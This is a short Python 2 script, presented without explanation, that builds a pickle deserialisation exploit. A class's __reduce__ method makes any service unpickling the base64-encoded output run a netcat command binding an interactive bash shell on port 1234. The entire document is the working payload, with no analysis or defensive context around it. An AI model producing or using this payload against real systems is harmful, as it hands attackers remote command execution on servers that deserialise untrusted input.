import base64
import cPickle
import os


class Blah(object):
    def __reduce__(self):
        return (os.system,(
    "netcat -c '/bin/bash -i' -l -p 1234 ",))

print base64.b64encode(cPickle.dumps(Blah()))
